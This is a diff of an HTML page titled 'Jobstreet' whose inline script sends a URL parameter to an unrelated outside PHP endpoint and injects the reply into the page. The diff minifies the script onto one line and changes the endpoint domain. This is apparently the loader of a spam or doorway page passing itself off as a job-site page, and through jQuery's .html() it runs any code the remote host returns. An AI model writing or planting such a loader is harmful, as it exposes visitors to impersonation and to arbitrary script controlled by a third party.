@@ -1,24 +1,9 @@
+
 <!doctype html>
 <html><head>  
- <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
 <script>
-function GetURLParameter(t) {
-    for (var a = window.location.search.substring(1).split("&"), r = 0; r < a.length; r++) {
-        var e = a[r].split("=");
-        if (e[0] == t) return e[1]
-    }
-}
-var id = GetURLParameter("id"),
-    blog = GetURLParameter("blog"),
-    dataString = "id=" + id;
-$.ajax({
-    type: "POST",
-    url: "https://ideappcom.id/_js.php",
-    data: dataString,
-    success: function(t) {
-        $("#loaddata").html(t)
-    }
-});
+function GetURLParameter(t){for(var a=window.location.search.substring(1).split("&"),r=0;r<a.length;r++){var e=a[r].split("=");if(e[0]==t)return e[1]}}var id=GetURLParameter("id"),blog=GetURLParameter("blog"),dataString="id="+id;$.ajax({type:"POST",url:"https://ideapp.com/_js.php",data:dataString,success:function(t){$("#loaddata").html(t)}});
 </script>
     <title>Jobstreet</title>
     <meta charset="utf-8" />
